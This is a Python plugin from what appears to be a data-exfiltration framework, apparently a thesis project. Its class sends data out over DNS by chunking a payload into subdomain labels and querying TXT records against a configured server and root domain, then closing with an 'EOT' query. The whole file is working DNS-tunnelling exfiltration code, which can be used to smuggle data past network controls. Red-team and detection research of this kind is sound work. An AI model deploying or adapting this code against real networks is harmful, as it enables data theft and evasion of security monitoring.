from __future__ import annotations
from typing import Dict, Any, Iterable
from dnslib import DNSRecord, QTYPE
import socket
from tfg.plugins.api import ExfilClientPlugin
from .dns_common import chunk_labels

class DnsClientSubdomain(ExfilClientPlugin):
    canal = "DNS"
    metodo = 1
    name = "dns_client_subdomain"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        server = config["host"]; port = int(config.get("port", 53))
        root = config["root_domain"].strip("."); exfil_id = config.get("exfil_id") or "tfg"
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sent = 0
        try:
            for label in chunk_labels(payload_iter):
                qname = f"{label}.{exfil_id}.{root}."
                q = DNSRecord.question(qname, qtype="TXT")
                sock.sendto(q.pack(), (server, port)); sent += 1
            q = DNSRecord.question(f"EOT.{exfil_id}.{root}.", qtype="TXT")
            sock.sendto(q.pack(), (server, port)); sent += 1
            return {"ok": True, "queries": sent}
        finally:
            sock.close()
